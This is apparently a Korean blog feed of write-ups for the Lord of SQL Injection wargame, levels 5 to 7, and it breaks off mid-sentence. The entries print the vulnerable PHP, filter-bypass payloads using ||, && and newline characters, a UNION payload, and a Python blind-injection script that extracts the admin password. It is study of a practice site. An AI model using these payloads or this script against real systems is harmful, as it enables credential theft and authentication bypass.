    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 7번 orge 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>OR</code>, <code>AND</code>를 사용하지 않고 Blind SQL Injection을 수행하여 원하는 문자열을 얻어낼 수 있는지 확인한다.<br>또는 <code>UNION</code> 구문과 <code>LIMIT</code>을 이용하여 원하는 문자열을 얻어낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>orge 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/or|and/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_orge where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_orge where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orge"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/or|and/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>pw</code>에 대소문자 구분 없이 <code>or</code>, <code>and</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_orge where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_orge where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orge"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET 방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>SUBSTR 함수 활용</p><p>Blind SQL Injection 문제이므로 4번 orc 문제에서 이용한 코드를 수정하여 활용한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4번 orc 문제에서 이용한 코드에서 추가된 부분</span></span><br><span class="line">pwlen = <span class="number">0</span> <span class="comment"># pw의 길이값을 저장한 변수</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>): <span class="comment"># pw의 길이를 알아내기 위한 반복문. 길이가 1보다 크거나 같고 20보다 작다는 전제 하에 작동한다. 만약 길이를 알아내는 데 실패하면 범위를 넓힌다.</span></span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="</span></span><br><span class="line">    data = <span class="string">"' || id='admin' &amp;&amp; length(pw)='&#123;&#125;'#"</span>.format(str(i)) <span class="comment"># length() 함수를 통해 pw의 길이를 알아내는 부분이다.</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i <span class="comment"># pw의 길이를 pwlen 변수에 저장한다.</span></span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># /4번 orc 문제에서 이용한 코드에서 추가된 부분</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>): <span class="comment"># i에는 1부터 pwlen까지 들어가도록 반복문을 구성</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="</span></span><br><span class="line">        data = <span class="string">"' || id='admin' &amp;&amp; substr(pw, 1, &#123;&#125;)='&#123;&#125;'#"</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>6c864dec</code>를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=6c864dec</span><br></pre></td></tr></table></figure></li><li><p><code>UNION</code> 구문 및 <code>LIMIT</code> 구문 이용</p><p>7번 문제는 <code>UNION</code> 구문을 필터링 하지 않고 있으므로 <code>UNION</code>을 통해 바로 <code>pw</code>값을 알아내는 시도를 해볼 수 있다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=-1&apos; || @a:=pw %26%26 0 union select @a-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_orge <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> || @a:=pw &amp;&amp; <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> @a<span class="comment">-- -'</span></span><br></pre></td></tr></table></figure><p><code>Hello 6c864dec</code></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 7번 orge 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.6 Darkelf</title>
    <link href="https://www.jslee.me/2019/08/17/los-write-up-06-darkelf/"/>
    <id>https://www.jslee.me/2019/08/17/los-write-up-06-darkelf/</id>
    <published>2019-08-17T13:42:40.000Z</published>
    <updated>2019-08-20T11:08:10.062Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 6번 darkelf 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>or</code>, <code>and</code>를 사용하지 않고 원하는 문자열을 <code>SELECT</code> 하도록 SQL을 조작할 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkelf 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/or|and/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkelf where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"darkelf"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/or|and/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>pw</code>에 대소문자 구분 없이 <code>or</code>, <code>and</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkelf where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"darkelf"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>||</code>, <code>&amp;&amp;</code> 이용</p><p>논리 연산을 막기 위해 <code>OR</code>, <code>AND</code>를 필터링 한 문제이다.</p><p>그러나 논리 연산은 위 두 연산자 뿐만 아니라 <code>||</code>, <code>&amp;&amp;</code> 연산자도 존재한다.</p><p><code>OR</code>은 <code>||</code>로 완전히 대체 가능하고, <code>AND</code>는 <code>&amp;&amp;</code>로 완전히 대체 가능하다.</p><p>이때, URL에 직접 SQL Injection을 수행하는 경우 <code>&amp;</code> 문자는 그대로 삽입하면 작동하지 않으므로 URL Encoding을 거친 <code>%26</code> 으로 삽입하여야 한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php?pw=&apos; || id=&apos;admin&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_darkelf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> || <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -'</span></span><br></pre></td></tr></table></figure><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 6번 darkelf 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.5 Wolfman</title>
    <link href="https://www.jslee.me/2019/08/16/los-write-up-05-wolfman/"/>
    <id>https://www.jslee.me/2019/08/16/los-write-up-05-wolfman/</id>
    <published>2019-08-16T05:19:32.000Z</published>
    <updated>2019-08-20T11:08:10.032Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 5번 wolfman 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>공백문자(‘ ‘)를 사용하지 않고 원하는 문자열을 <code>SELECT</code> 하도록 SQL을 조작할 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>wolfman 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/ /i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No whitespace ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_wolfman where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"wolfman"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/ /i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No whitespace ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>pw</code>에 <code>공백문자(&#39; &#39;)</code> 가 들어 있으면 <code>No whitespace ~_~</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_wolfman where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"wolfman"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>CR(Carriage Return) 이용</p><p>ASCII Code 표를 살펴보면 16진수로 <code>0x0D</code>는 <code>Carriage Return</code>에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;%0Dor%0Did=&apos;admin&apos;--%0D-</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -'</span></span><br></pre></td></tr></table></figure><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p>LF(Line Feed)</p><p>ASCII Code 표를 살펴보면 16진수로 <code>0x0A</code>는 <code>Line Feed</code>에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;%0Aor%0Aid=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#'</span></span><br></pre></td></tr></table></figure><p>주석으로 <code>#</code>을 쓴 이유는 <code>-- -</code>을 사용할 때 가운데 공백으로 %0A를 사용하면 정상적으로 작동하지 않기 